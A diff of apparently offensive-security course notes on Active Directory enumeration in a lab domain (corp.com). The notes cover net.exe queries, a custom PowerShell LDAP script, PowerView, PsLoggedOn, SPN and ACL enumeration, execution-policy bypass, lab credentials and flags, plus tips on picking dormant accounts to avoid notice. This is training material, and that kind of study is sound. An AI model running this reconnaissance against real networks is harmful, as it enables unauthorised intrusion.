@@ -113,12 +113,12 @@ bloodhound-python -c All -u analyst -p &#39;Passw0rd!&#39; -d corp.local -gc dc0
 <li>Domain <code>/d</code></li>
 <li>Password <code>LegmanTeamBenzoin!!</code></li>
 </ul>
-<pre><code>┌──(operator㉿labhost)-[~/OffSec]
+<pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec]
 └─$ xfreerdp /u:stephanie /d:corp.com /v:192.168.227.75 
 </code></pre>
 <p>AD contains enourmous amounts of information, it can be hard to determine where to start enumerating.  Since every AD install contains users and groups, we start there.</p>
 <p>Start gathering user info with <a href="https://learn.microsoft.com/en-US/troubleshoot/windows-server/networking/net-commands-on-operating-systems">net.exe</a>, installed by default on all Win OS systems.  Specifically we will use the <code>net user</code> sub-command.  As we know, we can use this tool to enum local accounts onthe machine, we&#39;ll use the <code>/domain</code> to print out users on the domain.</p>
-<pre><code>C:\Users\stephanie&gt;net user /domain
+<pre><code class="language-powershell">C:\Users\stephanie&gt;net user /domain
 The request will be processed at a domain controller for domain corp.com.
 
 
@@ -137,7 +137,7 @@ The command completed successfully.
 </ul>
 <p>Admins have a tendancy to add prefix or suffix to usernames that identify accounts by their function.  Based on the output, we should check out the <code>jeffadmin</code> user because it may be an admin account.</p>
 <p>Inspect with <code>net.exe</code> and the <code>/domain</code> flag.</p>
-<pre><code>C:\Users\stephanie&gt;net user jeffadmin /domain
+<pre><code class="language-powershell">C:\Users\stephanie&gt;net user jeffadmin /domain
 The request will be processed at a domain controller for domain corp.com.
 
 User name                    jeffadmin
@@ -171,7 +171,7 @@ The command completed successfully.
 <li>If we compromise this account we elevate to domain admin.</li>
 </ul>
 <p>We can also use <code>net.exe</code> to enum groups in the domain with <code>net group</code>.</p>
-<pre><code>C:\Users\stephanie&gt;net group /domain
+<pre><code class="language-powershell">C:\Users\stephanie&gt;net group /domain
 The request will be processed at a domain controller for domain corp.com.
 
 
@@ -207,7 +207,7 @@ The command completed successfully.
 <li>Development Department.</li>
 </ul>
 <p>We use <code>net</code> again to enum group members, focusing on Sales Department.</p>
-<pre><code>C:\Users\stephanie&gt;net group &quot;Sales Department&quot; /domain
+<pre><code class="language-powershell">C:\Users\stephanie&gt;net group &quot;Sales Department&quot; /domain
 The request will be processed at a domain controller for domain corp.com.
 
 Group name     Sales Department
@@ -225,7 +225,7 @@ The command completed successfully.
 <p>In real-world, enum each group and catalog the results.  This requires good organization, which we will discuss later, but we for now we will move on to more flexible alternatives to <code>net.exe</code>.</p>
 <h5>Exercises</h5>
 <p>Start VM Group 2 and log in to CLIENT75 as stephanie. Use net.exe to enumerate the users and groups in the modified corp.com domain to obtain the flag.</p>
-<pre><code>C:\Users\stephanie&gt;net user /domain
+<pre><code class="language-powershell">C:\Users\stephanie&gt;net user /domain
 The request will be processed at a domain controller for domain corp.com.
 
 
@@ -684,7 +684,7 @@ OS{5238191c2bb34180ed3cf20295ff4aa2}
 <p>Let&#39;s begin writing our script by obtaining the required hostname for the PDC.</p>
 <p>In the MS .NET classes relating to AD we will find the <code>System.DirectoryServices.ActiveDirectory</code> namespace.  We will focus on the <a href="https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectory.domain?view=windowsdesktop-7.0">Domain Class</a>, but there are several classes to choose from.  It contains a reference to the <code>PdcRoleOwner</code> in the properties.  We find a method called <code>GetCurrentDomain()</code> which returns the domain object for the current user, <code>stephanie</code> in this case.</p>
 <p>To invoke <code>Domain Class</code> and <code>GetCurrentDomain()</code> we run the following command in PowerShell.</p>
-<pre><code>PS C:\Users\stephanie&gt; [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+<pre><code class="language-powershell">PS C:\Users\stephanie&gt; [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
 
 
 Forest                  : corp.com
@@ -710,7 +710,7 @@ $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain
 $domainObj
 </code></pre>
 <p>We must bypass execution policy to run our script with <code>powershell -ep bypass</code></p>
-<pre><code>PS C:\Users\stephanie\Desktop&gt; powershell.exe -ep bypass
+<pre><code class="language-powershell">PS C:\Users\stephanie\Desktop&gt; powershell.exe -ep bypass
 Windows PowerShell
 Copyright (C) Microsoft Corporation. All rights reserved.
 Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows                                                                                                             PS C:\Users\stephanie\Desktop&gt; .\enum.ps1
@@ -737,13 +737,13 @@ $PDC = $domainObj.PdcRoleOwner.Name
 $PDC
 </code></pre>
 <p>Running the script again.</p>
-<pre><code>PS C:\Users\stephanie\Desktop&gt; .\enum.ps1
+<pre><code class="language-powershell">PS C:\Users\stephanie\Desktop&gt; .\enum.ps1
 DC1.corp.com
 </code></pre>
 <p>In this case we have dynamically extracted the PDC from the <code>PdcRoleOwner</code> prop using Domain Class.</p>
 <p>We can also get the DN for the domain via the domain object, but it doesn&#39;t follow the LDAP naming standard.  We know that the base domain is <code>corp.com</code> and the DN would be <code>DC=corp</code>,<code>DC=com</code>.  We could grap <code>corp.com</code> from the Name prop in the domain object and tell PowerShell to break it up and add the <code>DC=</code> param.  However there is an easier way which assures we obtain the correct DN.</p>
 <p>We can use ADSI directly in PS to retrieve the DN.  Use two single quotes to indicate that the search starts at the top of the AD hierarchy.</p>
-<pre><code>PS C:\Users\stephanie\Desktop&gt; ([adsi]&#39;&#39;).distinguishedName
+<pre><code class="language-powershell">PS C:\Users\stephanie\Desktop&gt; ([adsi]&#39;&#39;).distinguishedName
 DC=corp,DC=com
 </code></pre>
 <ul>
@@ -766,7 +766,7 @@ $DN = ([adsi]&#39;&#39;).distinguishedName
 $DN
 </code></pre>
 <p>Run our script.</p>
-<pre><code>PS C:\Users\stephanie\Desktop&gt; .\enum.ps1
+<pre><code class="language-powershell">PS C:\Users\stephanie\Desktop&gt; .\enum.ps1
 DC1.corp.com
 DC=corp,DC=com
 </code></pre>
@@ -781,7 +781,7 @@ $LDAP = &quot;LDAP://$PDC/$DN&quot;
 $LDAP
 </code></pre>
 <p>Run our script.</p>
-<pre><code>PS C:\Users\stephanie\Desktop&gt; .\enum.ps1
+<pre><code class="language-powershell">PS C:\Users\stephanie\Desktop&gt; .\enum.ps1
 LDAP://DC1.corp.com/DC=corp,DC=com
 </code></pre>
 <ul>
@@ -816,7 +816,7 @@ $dirsearcher.FindAll()
 <li>Pointing to the top of the hierarchy where <code>DirectorySearcher</code> will run the <code>FindAll()</code> method.</li>
 </ul>
 <p>Since the search starts at the top and we aren&#39;t filtering results, it generates a lot fo output.</p>
-<pre><code>PS C:\Users\stephanie\Desktop&gt; .\enum.ps1
+<pre><code class="language-powershell">PS C:\Users\stephanie\Desktop&gt; .\enum.ps1
 
 Path
 ----
@@ -915,7 +915,7 @@ Foreach($obj in $result)
 </ul>
 <p>The <code>Write-Host</code> command is not required for the script to function but it does print a line between each object, making the output easier to read.</p>
 <p>The script outputs a lot of information, which can become overwhelming depending on the number of domain users.  The listing below shows a partial view of <code>jeffeadmin</code> attributes.</p>
-<pre><code>PS C:\Users\stephanie\Desktop&gt; .\enum.ps1
+<pre><code class="language-powershell">PS C:\Users\stephanie\Desktop&gt; .\enum.ps1
 ...
 logoncount                     {173}
 codepage                       {0}
@@ -951,7 +951,7 @@ accountexpires                 {9223372036854775807}
 ...
 </code></pre>
 <p>We can filter based on any prop of any object type.  In the example below we make two changes.  First we change the filter to use the <code>name</code> prop to only show info about <code>jeffadmin</code>.  Secondly we added <code>.memberof</code> to the <code>$prop</code> var to only display the groups <code>jeffadmin</code> is a member of.</p>
-<pre><code>PS C:\Users\stephanie\Desktop&gt; .\enum.ps1
+<pre><code class="language-powershell">PS C:\Users\stephanie\Desktop&gt; .\enum.ps1
 CN=Domain Admins,CN=Users,DC=corp,DC=com
 CN=Administrators,CN=Builtin,DC=corp,DC=com
 </code></pre>
@@ -988,10 +988,10 @@ CN=Administrators,CN=Builtin,DC=corp,DC=com
 <li>Displayed in terminal depening on our needs.</li>
 </ul>
 <p>To use the function import it into memory.</p>
-<pre><code>PS C:\Users\stephanie&gt; Import-Module .\function.ps1
+<pre><code class="language-powershell">PS C:\Users\stephanie&gt; Import-Module .\function.ps1
 </code></pre>
 <p>In PowerShell we can now use the LDAPSearch command to obtain info from AD.  To repear the user enum we did earlier, we can again filter on the <code>specificAccountType</code></p>
-<pre><code>PS C:\Users\stephanie\Desktop&gt; LDAPSearch -LDAPQuery &quot;(samAccountType=805306368)&quot;
+<pre><code class="language-powershell">PS C:\Users\stephanie\Desktop&gt; LDAPSearch -LDAPQuery &quot;(samAccountType=805306368)&quot;
 
 Path                                                         Properties
 ----                                                         ----------
@@ -1014,7 +1014,7 @@ Path                                                     Properties
 LDAP://DC1.corp.com/CN=jeffadmin,CN=Users,DC=corp,DC=com {logoncount, codepage, objectcategory,...
 </code></pre>
 <p>We can also search directly for an Object Class, the component of AD that defines the object type.  Use <code>onjectClass=group</code> to list all groups in the domain.</p>
-<pre><code>PS C:\Users\stephanie&gt; LDAPSearch -LDAPQuery &quot;(objectclass=group)&quot;
+<pre><code class="language-powershell">PS C:\Users\stephanie&gt; LDAPSearch -LDAPQuery &quot;(objectclass=group)&quot;
 
 ...                                                                                 ----------
 LDAP://DC1.corp.com/CN=Read-only Domain Controllers,CN=Users,DC=corp,DC=com            {usnchanged, distinguishedname, grouptype, whencreated...}
@@ -1054,10 +1054,10 @@ Development Department        {CN=Management Department,DC=corp,DC=com, CN=pete,
 <p>We have expanded teh props for each object, the group object in this case, and printed the member attributes for each group.</p>
 <p>We reveal something unexpected, when we enum the <code>Sales Department</code> group earlier with <code>net.exe</code> we only found two users, <code>pete</code> and <code>stephanie</code>.  In this case it appears that Development Department is also a member.</p>
 <p>Since the output can be somewhat difficult to read we search from groups, but specify <code>Sales Department</code> in the query and pipe it to a var in our PS command line.</p>
-<pre><code>PS C:\Users\stephanie&gt; $sales = LDAPSearch -LDAPQuery &quot;(&amp;(objectCategory=group)(cn=Sales Department))&quot;
+<pre><code class="language-powershell">PS C:\Users\stephanie&gt; $sales = LDAPSearch -LDAPQuery &quot;(&amp;(objectCategory=group)(cn=Sales Department))&quot;
 </code></pre>
 <p>Now that we have one object in our var, we can just print the member attribute directly.</p>
-<pre><code>PS C:\Users\stephanie\Desktop&gt; $sales.properties.member
+<pre><code class="language-powershell">PS C:\Users\stephanie\Desktop&gt; $sales.properties.member
 CN=Development Department,DC=corp,DC=com
 CN=pete,CN=Users,DC=corp,DC=com
 CN=stephanie,CN=Users,DC=corp,DC=com
@@ -1072,7 +1072,7 @@ CN=stephanie,CN=Users,DC=corp,DC=com
 <li>It can only display specific attributes, emphasizing the benefits of custom tools.</li>
 </ul>
 <p>Now that we know there is a nested group let&#39;s enum it.</p>
-<pre><code>PS C:\Users\stephanie\Desktop&gt; $group = LDAPSearch -LDAPQuery &quot;(&amp;(objectCategory=group)(cn=Development Department*))&quot;
+<pre><code class="language-powershell">PS C:\Users\stephanie\Desktop&gt; $group = LDAPSearch -LDAPQuery &quot;(&amp;(objectCategory=group)(cn=Development Department*))&quot;
 PS C:\Users\stephanie\Desktop&gt; $group.properties.member
 CN=Management Department,DC=corp,DC=com
 CN=pete,CN=Users,DC=corp,DC=com
@@ -1084,7 +1084,7 @@ CN=dave,CN=Users,DC=corp,DC=com
 </ul>
 </li>
 </ul>
-<pre><code>PS C:\Users\stephanie\Desktop&gt; $group = LDAPSearch -LDAPQuery &quot;(&amp;(objectCategory=group)(cn=Management Department*))&quot;
+<pre><code class="language-powershell">PS C:\Users\stephanie\Desktop&gt; $group = LDAPSearch -LDAPQuery &quot;(&amp;(objectCategory=group)(cn=Management Department*))&quot;
 PS C:\Users\stephanie\Desktop&gt; $group.properties.member
 CN=jen,CN=Users,DC=corp,DC=com
 </code></pre>
@@ -1095,7 +1095,7 @@ CN=jen,CN=Users,DC=corp,DC=com
 <p>Note that <code>jen</code> is only part of <code>Mangement Department</code> group, but she is also an indirect member Sales and Development groups, because groups inherit from each other.  This is normal behaviour in AD, if misconfigured though users can end up with more privs than inteded!  This can allow attackers to take advantage of the misconfig to expand their reach in the domain.</p>
 <h6>Labs</h6>
 <p>Start VM Group 2 and log in to CLIENT75 as stephanie. Use the newly developed PowerShell script to enumerate the domain groups, starting with Service Personnel. Unravel the nested groups, then enumerate the attributes for the last direct user member of the nested groups to obtain the flag.</p>
-<pre><code>PS C:\Users\stephanie&gt; powershell -ep bypass
+<pre><code class="language-powershell">PS C:\Users\stephanie&gt; powershell -ep bypass
 Windows PowerShell
 Copyright (C) Microsoft Corporation. All rights reserved.
 
@@ -1191,11 +1191,11 @@ accountexpires                 {9223372036854775807}
 <p>So far we have only focused on enumerating users and groups.  The tools we have used so far have given us a basic understanding of how to communicate with AD and<a href="https://powersploit.readthedocs.io/en/latest/Recon/">PowerView</a> retrieve information, other researchers have created more advanced tools for this purpose.</p>
 <p><a href="https://powersploit.readthedocs.io/en/latest/Recon/">PowerView</a> PowerShell script is a popular option including many functions to improve the effectiveness of enumeration.</p>
 <p>Let&#39;s get acquainted with PowerView by walking through our prior enumeration steps.  PowerView is already installed in <code>C:\Tools</code> dir of CLIENT75.  To use it we must first import it to memory.</p>
-<pre><code>PS C:\Tools&gt; Import-Module .\PowerView.ps1
+<pre><code class="language-powershell">PS C:\Tools&gt; Import-Module .\PowerView.ps1
 </code></pre>
 <p>With the module imported we can explore the available commands.  Refer to the linked reference for a list of all commands.</p>
 <p>Start by running <code>Get-NetDomain</code> which gives us basic information about the domain (where we previously used GetCurrentDomain).</p>
-<pre><code>PS C:\Users\stephanie&gt; Get-NetDomain
+<pre><code class="language-powershell">PS C:\Users\stephanie&gt; Get-NetDomain
 
 
 Forest                  : corp.com
@@ -1213,7 +1213,7 @@ Name                    : corp.com
 <li>PowerView uses .NET classes to obtain LDAP path and comm with AD.</li>
 </ul>
 <p>Let&#39;s get a list of all users in the domain with <code>Get-Netuser</code></p>
-<pre><code>PS C:\Users\stephanie&gt; Get-NetUser
+<pre><code class="language-powershell">PS C:\Users\stephanie&gt; Get-NetUser
 
 
 logoncount             : 546
@@ -1277,7 +1277,7 @@ lastlogon              : 12/31/1600 4:00:00 PM
 </ul>
 <p>In our script we used loops to print certain attributes based on the info obtained.  With PowerView we can pipe the output into <code>select</code>, where we can choose specific attributes.</p>
 <p>The <code>cn</code> attribute holds the username of the user, pipe the output to <code>select</code> and choose the <code>cn</code> attribute.</p>
-<pre><code>PS C:\Users\stephanie&gt; Get-NetUser | select cn
+<pre><code class="language-powershell">PS C:\Users\stephanie&gt; Get-NetUser | select cn
 
 cn
 --
@@ -1297,7 +1297,7 @@ jen
 </ul>
 <p>There are many interesting attributes to search for when enumerating AD.  If a user is dormant, they have not changed their password or logged in recently, we will draw less attention if we take over the account during an engagement.  Also, if a user hasn&#39;t changed their password since a recent password policy update, their password may be weaker than the current policy making it weaker to password attacks.</p>
 <p>This can be easily investigated, run <code>Get-NetUser</code> again, piping the output to <code>select</code> and extracting the following attributes.</p>
-<pre><code>PS C:\Users\stephanie&gt; Get-NetUser | select cn,pwdlastset,lastlogon
+<pre><code class="language-powershell">PS C:\Users\stephanie&gt; Get-NetUser | select cn,pwdlastset,lastlogon
 
 cn            pwdlastset            lastlogon
 --            ----------            ---------
@@ -1318,7 +1318,7 @@ jen           9/6/2022 12:43:01 PM  3/8/2023 11:39:06 PM
 <li>Last user login.</li>
 </ul>
 <p>We can also use it to enumerate groups.</p>
-<pre><code>PS C:\Users\stephanie&gt; Get-NetGroup | select cn
+<pre><code class="language-powershell">PS C:\Users\stephanie&gt; Get-NetGroup | select cn
 
 cn
 --
@@ -1376,7 +1376,7 @@ Development Department
 Debug
 </code></pre>
 <p>We will not go through the process of traversing nested groups, but let&#39;s investigate <code>Sales Department</code> using <code>Get-NetGroup</code> and pipe the output into <code>select member</code>.</p>
-<pre><code>PS C:\Users\stephanie&gt; Get-NetGroup &quot;Sales Department&quot; | select member
+<pre><code class="language-powershell">PS C:\Users\stephanie&gt; Get-NetGroup &quot;Sales Department&quot; | select member
 
 member
 ------
@@ -1419,7 +1419,7 @@ member
 ### nathalie
 </code></pre>
 <p>Continue enumerating the corp.com domain in VM Group 2. Enumerate which Office the user fred is working in to obtain the flag.</p>
-<pre><code>PS C:\Tools&gt; Get-NetUser | select cn,physicaldeliveryofficename
+<pre><code class="language-powershell">PS C:\Tools&gt; Get-NetUser | select cn,physicaldeliveryofficename
 
 cn            physicaldeliveryofficename
 --            --------------------------
@@ -1451,7 +1451,7 @@ michelle
 <h5>Enumerating Operating Systems</h5>
 <p>In a typical pentest we use various recon tools to detect the OS a client or server is running.  We can also enumerate this from Active Directory.</p>
 <p>Use the <code>Get-NetComputer</code> PowerView command to enum the computer objects in the domain.</p>
-<pre><code>PS C:\Tools&gt; Import-Module .\PowerView.ps1
+<pre><code class="language-powershell">PS C:\Tools&gt; Import-Module .\PowerView.ps1
 PS C:\Tools&gt; Get-NetComputer
 
 
@@ -1679,7 +1679,7 @@ name                          : client76
 dnshostname                   : CLIENT76.corp.com
 </code></pre>
 <p>We&#39;ll search for operating system and hostname.</p>
-<pre><code>PS C:\Tools&gt; Get-NetComputer | select operatingsystem,dnshostname
+<pre><code class="language-powershell">PS C:\Tools&gt; Get-NetComputer | select operatingsystem,dnshostname
 
 operatingsystem              dnshostname
 ---------------              -----------
@@ -1699,7 +1699,7 @@ Windows 10 Pro               CLIENT76.corp.com
 <p>So far we have enumed a list of all objects in the domain as well as their attributes.  In the next section we will use this info to determine the relationships between various objects in search of attack vectors.</p>
 <h6>Labs</h6>
 <p>Start VM Group 1 and log in to CLIENT75 as stephanie. Repeat the PowerView enumeration steps as outlined in this section. What is the DistinguishedName for the WEB04 machine?</p>
-<pre><code>PS C:\Tools&gt; Get-NetComputer | select operatingsystem,dnshostname,distinguishedname
+<pre><code class="language-powershell">PS C:\Tools&gt; Get-NetComputer | select operatingsystem,dnshostname,distinguishedname
 
 operatingsystem              dnshostname       distinguishedname
 ---------------              -----------       -----------------
@@ -1711,7 +1711,7 @@ Windows 11 Enterprise        client75.corp.com CN=client75,CN=Computers,DC=corp,
 Windows 10 Pro               CLIENT76.corp.com CN=client76,CN=Computers,DC=corp,DC=com
 </code></pre>
 <p>Continue enumerating the operating systems in VM Group 1. What is the exact operating system version for FILES04? Make sure to provide both the major and minor version number in the answer.</p>
-<pre><code>PS C:\Tools&gt; Get-NetComputer | select operatingsystem,operatingsystemversion,dnshostname
+<pre><code class="language-powershell">PS C:\Tools&gt; Get-NetComputer | select operatingsystem,operatingsystemversion,dnshostname
 
 operatingsystem              operatingsystemversion dnshostname
 ---------------              ---------------------- -----------
@@ -1723,7 +1723,7 @@ Windows 11 Enterprise        10.0 (22000)           client75.corp.com
 Windows 10 Pro               10.0 (16299)           CLIENT76.corp.com
 </code></pre>
 <p>Start VM Group 2 and log in to CLIENT75 as stephanie. Use PowerView to enumerate the operating systems in the modified corp.com domain to obtain the flag.</p>
-<pre><code>PS C:\Users\stephanie&gt; powershell -ep bypass
+<pre><code class="language-powershell">PS C:\Users\stephanie&gt; powershell -ep bypass
 Windows PowerShell
 Copyright (C) Microsoft Corporation. All rights reserved.
 
@@ -1757,7 +1757,7 @@ OS{cdcf1b0cdbd7296287de5e0c5763854a}
 <p>PowerView&#39;s <code>Find-LocalAdminAccess</code> command scans the network in an attempt to determine if our current user has admin perms on any computers in the domain.  The command relies on <code>OpenServiceW</code> <a href="https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openservicew">function</a>, which connects to Service Control Manager (SCM) of the target machines.  The SCM maintains a DB of installed services and drivers on Win computers.  PowerView will attempt to open this DB with the SC_MANAGER_ALL_ACCESS access right, wich requires admin privs, and if successful PowerView will deem that our current user has admin privs on the target.</p>
 <p>Run <code>Find-LocalAdminAccess</code> against <code>corp.com</code>.  The command supports params like <code>Computername</code> and <code>Credentials</code> but we will run it without params in this case since we are interested in enum all computers and we are already logged in as <code>stephanie</code>.  Essentially, we are spraying the env to find possible local admin access on computers under our current context.</p>
 <p><em>Depending on the size of the environment, it may take a few minutes for Find-LocalAdminAccess to finish.</em></p>
-<pre><code>PS C:\Users\stephanie&gt; powershell -ep bypass
+<pre><code class="language-powershell">PS C:\Users\stephanie&gt; powershell -ep bypass
 Windows PowerShell
 Copyright (C) Microsoft Corporation. All rights reserved.
 
@@ -1776,7 +1776,7 @@ client74.corp.com
 <p>Continue by visualizing how computers and users are connected to one another.  The first step is to obtain info such as which users are logged into with computers.</p>
 <p>Historically, the two best Win APIs that may still achieve these goals are <a href="https://learn.microsoft.com/en-us/windows/win32/api/lmwksta/nf-lmwksta-netwkstauserenum">NetWkstaUserEnum</a> and <a href="https://learn.microsoft.com/en-us/windows/win32/api/lmshare/nf-lmshare-netsessionenum">NetSessionEnum</a>.  The former requires admin privs while the later does not.  Win has undergone changes over the last few years, which may make the discovery of logged in user enum more difficult for us.</p>
 <p>PowerView&#39;s <code>Get-NetSession</code> command users <code>NetWkstaUserEnum</code> and <code>NetSessionEnum</code> API under the hood.  Let&#39;s try to run it against some fo the machines in the domain to see if we can find any logged in users.</p>
-<pre><code>PS C:\Users\stephanie&gt; cd C:\Tools\
+<pre><code class="language-powershell">PS C:\Users\stephanie&gt; cd C:\Tools\
 PS C:\Tools&gt; Import-Module .\PowerView.ps1
 PS C:\Tools&gt; Get-NetSession -ComputerName files04
 PS C:\Tools&gt; Get-NetSession -ComputerName web04
@@ -1786,7 +1786,7 @@ PS C:\Tools&gt; Get-NetSession -ComputerName web04
 <li>There may be no users logged into the machine.</li>
 <li>Assure we aren&#39;t receiving error messages by adding <code>-Verbose</code></li>
 </ul>
-<pre><code>PS C:\Tools&gt; Get-NetSession -ComputerName files04 -Verbose
+<pre><code class="language-powershell">PS C:\Tools&gt; Get-NetSession -ComputerName files04 -Verbose
 VERBOSE: [Get-NetSession] Error: Access is denied
 PS C:\Tools&gt; Get-NetSession -ComputerName web04 -Verbose
 VERBOSE: [Get-NetSession] Error: Access is denied
@@ -1796,7 +1796,7 @@ VERBOSE: [Get-NetSession] Error: Access is denied
 <li>We are not allowed to run the query, likey due to perms.</li>
 </ul>
 <p>We may have admin privs on CLIENT74 with <code>stephanie</code>, run it against the machine and inspect the results.</p>
-<pre><code>PS C:\Tools&gt; Get-NetSession -ComputerName client74
+<pre><code class="language-powershell">PS C:\Tools&gt; Get-NetSession -ComputerName client74
 
 
 CName        : \\192.168.214.75
@@ -1821,7 +1821,7 @@ ComputerName : client74
 <p>The perms required to enum sessions with <code>NetSessionEnum</code> are defined in the <code>SrvsvcSessionInfo</code> reg key located in the <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity</code> hive.</p>
 <p>We use the Win 11 machine we are currently logged in on to check the perms, it may have different perms than the other machines in the env, it may give us an idea of what is going on.</p>
 <p>In order to view perms we use the PowerShell <a href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/get-acl?view=powershell-7.3">Get-Acl</a> cmdlet to retrieve the perms for the object we define with the <code>-Path</code> flag and print them in our PowerShell prompt.</p>
-<pre><code>PS C:\Tools&gt; Get-Acl -Path HKLM:SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity\ | fl
+<pre><code class="language-powershell">PS C:\Tools&gt; Get-Acl -Path HKLM:SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity\ | fl
 
 
 Path   : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\
@@ -1855,7 +1855,7 @@ Sddl   : O:SYG:SYD:AI(A;CIID;KR;;;BU)(A;CIID;KA;;;BA)(A;CIID;KA;;;SY)(A;CIIOID;K
 </ul>
 <p>In older Win versions, which MS does not specify, Authenticated Users were allowed to access the reg hive and obtain info from the <code>SrvsvcSessionInfo</code> key.  Following the least priv principle, regular domain users should not be able to access this info within the domain, likely part of the reason the perms for reg hive changed as well.  Due to perms, we can be certain NetSessionEnum will not be able to retrieve the info on default Win 11.</p>
 <p>Now we can get a better sense of the OS version in use, using <code>Net-GetComputer</code> and include the <code>operatingsystemversion</code> attribute.</p>
-<pre><code>PS C:\Tools&gt; Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion
+<pre><code class="language-powershell">PS C:\Tools&gt; Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion
 
 dnshostname       operatingsystem              operatingsystemversion
 -----------       ---------------              ----------------------
@@ -1877,7 +1877,7 @@ CLIENT76.corp.com Windows 10 Pro               10.0 (16299)
 <p>However, <code>PsLoggedOn</code> relies on the Remote Registry service to scan associated keys which limits it.  The Remote Registry service has not been enabled by default on Win workstations since Win 8, but sys admins may enable it for various admin tasks, backwards compatability, or for installing monitoring deploymnet tools, scripts, agents, etc.</p>
 <p>It is also enabled by default on later Win Server OS systems (Server 2012 R2, 2016 (1607), 2019 (1809), Server 2022 (21H2)).  If enabled the service will stop after ten minutes of inactivity to save resources, but will re-enable with an auto trigger once we connect with <code>PsLoggedOn</code>.</p>
 <p>With the theory out of the way let&#39;s try to run <code>PsLoggedOn</code> against the computers we attempted to enum earlier, starting with FILES04/WEB04.</p>
-<pre><code>PS C:\Tools\PSTools&gt; .\PsLoggedon.exe \\files04
+<pre><code class="language-powershell">PS C:\Tools\PSTools&gt; .\PsLoggedon.exe \\files04
 
 PsLoggedon v1.35 - See who&#39;s logged on
 Copyright (C) 2000-2016 Mark Russinovich
@@ -1903,7 +1903,7 @@ Unable to query resource logons
 <li>This may be a false positive as we cannot be sure the Remote Registry service is running, but received no error messages suggesting accurate output, for now we must trust the results.</li>
 </ul>
 <p>As we discovered earlier in this section we appear to have admin priv on CLIENT74 via <code>stephanie</code>, a high interest target, and we should enum session there as well.  For educational purposes we have enabled the Remote Registry service on CLIENT74.</p>
-<pre><code>PS C:\Tools\PSTools&gt; .\PsLoggedon.exe \\client74
+<pre><code class="language-powershell">PS C:\Tools\PSTools&gt; .\PsLoggedon.exe \\client74
 
 PsLoggedon v1.35 - See who&#39;s logged on
 Copyright (C) 2000-2016 Mark Russinovich
@@ -1983,7 +1983,7 @@ OS{f0f39f8a31b598b49d0262d5826f783c}
 <p>Since the info is registered and stored in AD, it is present on the DC.  To obtain the data we query the DC for specific SPNs.</p>
 <p>We have multiple options to enum the SPNs in the domain.  In this case we use <code>setspn.exe</code>, installed on Win by default.  We use <code>-L</code> to run against both servers and clients in the domain.</p>
 <p>We could iterate through a list of domain users, but we previously dicsovered the <code>iis_service</code> user.  We will start with that one.</p>
-<pre><code>PS C:\Tools&gt; setspn.exe -L iis_service
+<pre><code class="language-powershell">PS C:\Tools&gt; setspn.exe -L iis_service
 Registered ServicePrincipalNames for CN=iis_service,CN=Users,DC=corp,DC=com:
         HTTP/web04.corp.com
         HTTP/web04
@@ -1993,7 +1993,7 @@ Registered ServicePrincipalNames for CN=iis_service,CN=Users,DC=corp,DC=com:
 <li>We find an SPN linked to the <code>iis_service</code> account.</li>
 </ul>
 <p>We can also enum SPNs with PowerView by enuming all the accounts in the domain.  To obtain a clear list of SPNs, we can pipe the output into <code>select</code>, choosing <code>samaccountname</code> and <code>serviceprincipalname</code> attributes.</p>
-<pre><code>PS C:\Tools&gt; powershell -ep bypass
+<pre><code class="language-powershell">PS C:\Tools&gt; powershell -ep bypass
 Windows PowerShell
 Copyright (C) Microsoft Corporation. All rights reserved.
 
@@ -2015,7 +2015,7 @@ iis_service    {HTTP/web04.corp.com, HTTP/web04, HTTP/web04.corp.com:80}
 </li>
 </ul>
 <p>Let&#39;s attempt to resolve <code>web04.corp.com</code> with <code>nslookup</code>.</p>
-<pre><code>PS C:\Tools&gt; nslookup.exe web04.corp.com
+<pre><code class="language-powershell">PS C:\Tools&gt; nslookup.exe web04.corp.com
 DNS request timed out.
     timeout was 2 seconds.
 Server:  UnKnown
@@ -2053,7 +2053,7 @@ Self (Self-Membership): Add ourselves to for example a group
 <li>Other permissions are described in the <a href="https://learn.microsoft.com/en-us/windows/win32/secauthz/access-rights-and-access-masks">MS Docs</a></li>
 </ul>
 <p>We can use <code>Get-ObjectAcl</code> to enum ACEs with PowerView, let&#39;s enum our own user to determine which ACEs are applied to it and filter on <code>-Identity</code>:</p>
-<pre><code>PS C:\Tools&gt; Get-ObjectAcl -Identity stephanie
+<pre><code class="language-powershell">PS C:\Tools&gt; Get-ObjectAcl -Identity stephanie
 
 ...
 ObjectDN               : CN=stephanie,CN=Users,DC=corp,DC=com
@@ -2087,14 +2087,14 @@ AuditFlags             : None
 <li><code>S-1-5-21-1987370270-658905905-1781884369-1104</code>
 To make sense of the SID, we use PowerView&#39;s <code>Convert-SidToName</code> command to convert it to a domain object.</li>
 </ul>
-<pre><code>PS C:\Tools&gt; Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104
+<pre><code class="language-powershell">PS C:\Tools&gt; Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104
 CORP\stephanie
 </code></pre>
 <ul>
 <li>The SID in the ObjectSID prop belongs to <code>stephanie</code> user (current)</li>
 </ul>
 <p>The ActiveDirectoryRIghts prop describes the perms applied to the object.  To find out who has the ReadProperty perm, we convert the SecurityIdentifier value.</p>
-<pre><code>PS C:\Tools&gt; Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-553
+<pre><code class="language-powershell">PS C:\Tools&gt; Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-553
 CORP\RAS and IAS Servers
 </code></pre>
 <ul>
@@ -2112,7 +2112,7 @@ While <code>ObjectSID</code> is nice to have, it is unnecessary when enuming spe
 </ul>
 <p>We should enum all objects in the domain, but let&#39;s start with <code>Management Department</code> group.  We will check if any users have <code>GenericAll</code> permissions.</p>
